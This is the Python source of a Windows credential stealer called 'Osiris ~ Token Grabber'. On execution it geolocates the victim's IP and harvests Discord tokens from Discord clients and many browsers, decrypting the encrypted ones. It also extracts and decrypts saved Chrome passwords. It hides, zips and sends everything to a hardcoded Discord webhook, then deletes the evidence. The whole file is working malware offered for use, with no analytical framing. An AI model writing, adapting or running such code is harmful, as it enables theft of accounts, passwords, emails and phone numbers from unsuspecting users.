import requests
import os
import json
import base64
import sqlite3

from re import findall
from zipfile import ZipFile
from win32api import SetFileAttributes
from win32con import FILE_ATTRIBUTE_HIDDEN
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from shutil import copy2
from discord import Embed, File, RequestsWebhookAdapter, Webhook


webhook_url = "https://discord.com/api/webhooks/1018159167527206983/h2CUZFsdt5KiENbZvC79sXjCEgq78OODx21Ho5deUs7I-OtoiMsSvfs0XdwlXFRGxUDJ"
webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
embed = Embed(title=f'{os.getlogin()} ran Osiris ~ Token Grabber', color=4915330)

class Osiris:
    def __init__(self):
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]{120}"
        self.tokens = []

        self.IpInfo()
        self.findTokens()
        self.chrome_shit()
        self.SendInfo()

    def hide(self, file):
        SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)

    def zipup(self,file):
        with ZipFile(f'Osiris - {os.getenv("Username")}.zip', 'a') as zipf:
            zipf.write(file)
        self.hide(f'Osiris - {os.getenv("Username")}.zip')

    def headers_gen(self, token=None):
        
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }

        if token:
            headers.update({"Authorization": token})
        return headers

    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_value(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Failed to decrypt token!"

    def find_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def IpInfo(self) -> list:
        ip , city , region , country , org = "None", "None", "None", "None", "None"
        
        r = requests.get("https://ipinfo.io/json")

        ip = r.json()['ip']
        city = r.json()['city']
        region = r.json()['region']
        country = r.json()['country']
        org = r.json()['org']
        
        with open(".\\OSIRIS ~ IP-INFO.txt", "w", encoding="utf-8") as f:
            f.write(" ~ OSIRIS | Ip-Info ~ \n\n")
            f.write(f'''~ IP: [ {ip} ]\n~ CITY: [ {city} ]\n~ REGION: [ {region} ]\n~ COUNTRY: [ {country} ]\n~ ORG: [ {org} ]\n\n ''')
            f.write("~ Made by https://github.com/never-mind-who ~")

        self.hide(".\\OSIRIS ~ IP-INFO.txt")
        embed.add_field(name ="***~ OSIRIS | IP-INFO ~***",
                value= f'''💻 `IP` : **{ip}**\n📍`CITY` : **{city}**\n📌 `REGION` : **{region}**\n📪 `COUNTRY` : **{country}**\n🌐 `ORG`: **{org}**\n''',
                inline= False)

        self.zipup(".\\OSIRIS ~ IP-INFO.txt")
        os.remove(".\\OSIRIS ~ IP-INFO.txt")

        return [ ip , city , region , country , org ]

    def findTokens(self):
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb',
            'Chromium': self.appdata + r'\\Chromium\\User Data\\Default\\Local Storage\\leveldb',
            'Mozilla Firefox': self.roaming + r'\\Mozilla\\Firefox\\Profiles'
        }

        for _, path in paths.items():
            if not os.path.exists(path):
                continue
            if not "discord" in path:
                if "Mozilla" in path:
                    for loc, _, files in os.walk(path):
                        for _file in files:
                            if not _file.endswith('.sqlite'):
                                continue
                            for line in [x.strip() for x in open(f'{loc}\\{_file}', errors='ignore').readlines() if x.strip()]:
                                for token in findall(self.regex, line):
                                    r = requests.get("https://discord.com/api/v9/users/@me", headers=self.header_gen(token))
                                    if r.status_code == 200:
                                        if token in self.tokens:
                                            continue
                                        self.tokens.append(token)

                else:
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in findall(self.regex, line):
                                r = requests.get("https://discord.com/api/v9/users/@me", headers=self.headers_gen(token))
                                if r.status_code == 200:
                                    if token in self.tokens:
                                        continue
                                    self.tokens.append(token)
    
            else:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in findall(self.encrypted_regex, line):
                            for i in ["discordcanary", "discord", "discordptb"]:
                                if os.path.exists(self.roaming + f'\\{i}\\Local State'):
                                    token = self.decrypt_value(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.find_key(self.roaming + f'\\{i}\\Local State'))
                                    r = requests.get("https://discord.com/api/v9/users/@me", headers=self.headers_gen(token))
                                    if r.status_code == 200:
                                        if token in self.tokens:
                                            continue
                                        self.tokens.append(token)

        for x in self.tokens:
            j = requests.get("https://discord.com/api/v9/users/@me", headers=self.headers_gen(x)).json()
            name = j['username']+'#'+j['discriminator']
            email = j['email']
            phone = j['phone']
            id = j['id']

            try:
                if j['verified'] == True:
                    verified = "✅"
                else:
                    verified= "❌"
            except BaseException:
                verified = "❌"
            try:
                if j['mfa_enabled'] == True:
                    mfa = "✅"
                else:
                    mfa = "❌"
            except BaseException:
                mfa = "❌"
            try:
                if j['premium_type'] == 1:
                    nitro = 'Nitro Classic'
                elif j['premium_type'] == 2:
                    nitro = 'Nitro Boost'
            except BaseException:
                nitro = 'None'
            with open(f'.\\OSIRIS ~ {name}.txt', "w", encoding="utf-8") as f:
                    f.write(" ~ OSIRIS | Tokens ~ \n\n")
                    f.write(f'''~ Name: [ {name} ]\n~ ID: [ {id} ]\n~ TOKEN: [ {x} ]\n~ NITRO: [ {nitro} ] \n~ E-MAIL: [ {email} ]\n~ PHONE: [ {phone} ]\n~ MFA: [ {mfa} ]\n~ VERIFIED: [ {verified} ]\n\n''')
                    f.write("~ Made by https://github.com/never-mind-who ~")

            file = f'.\\OSIRIS ~ {name}.txt'
            self.hide(file)

            embed.add_field(name='***~ OSIRIS | '+ f'{name} ~***',
                            value=f'''```~~ ID: [ {id} ]\n~ TOKEN: [ {x} ]\n~ NITRO: [ {nitro} ] \n~ E-MAIL: [ {email} ]\n~ PHONE: [ {phone} ]\n~ MFA: [ {mfa} ]\n~ VERIFIED: [ {verified} ]\n\n''',
                            inline= False)
                    
            self.zipup(file)
            os.remove(file)


    def chrome_shit(self):
        self.google_paths = [
            self.appdata + '\\Google\\Chrome\\User Data\\Default',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 1',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 2',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 3',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 4',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 5',
        ]
        with open(".\\OSIRIS ~ GOOGLE.txt", "w", encoding="utf-8") as f:
           f.write(" ~ OSIRIS | Google Passwords ~ \n\n")

        for path in self.google_paths:
            path += '\\Login Data'
            if os.path.exists(path):
                copy2(path, "Loginvault.db")
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()
                with open(".\\OSIRIS ~ GOOGLE.txt", "a", encoding="utf-8") as f:
                    for result in cursor.execute(
                            "SELECT action_url, username_value, password_value FROM logins"):
                        url, username, password = result
                        password = self.decrypt_value(
                            password, self.find_key(self.appdata + '\\Google\\Chrome\\User Data\\Local State'))
                        if url and username and password != "":
                            f.write(
                                "Username: {:<30} | Password: {:<30} | Site: {:<30}\n\n".format(
                                    username, password, url))
                    f.write("~ Made by https://github.com/never-mind-who ~")                    
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")
        self.hide(".\\OSIRIS ~ GOOGLE.txt")    

        self.zipup(".\\OSIRIS ~ GOOGLE.txt")    
        os.remove(".\\OSIRIS ~ GOOGLE.txt")



    def SendInfo(self):
        embed.set_author(name="Osiris ~ Token Grabber", url="https://github.com/never-mind-who")
        embed.set_footer(text="**~ Osiris | made by never-mind-who ~**")
        embed.set_thumbnail(url="https://raw.githubusercontent.com/never-mind-who/never-mind-who/main/images/logo2.png")

        _file = File(f'Osiris - {os.getenv("Username")}.zip')
        webhook.send(embed=embed, avatar_url="https://raw.githubusercontent.com/never-mind-who/never-mind-who/main/images/logo2.png",username="~ Osiris ~")
        webhook.send( file=_file)
        os.remove(f'Osiris - {os.getenv("Username")}.zip')

Osiris()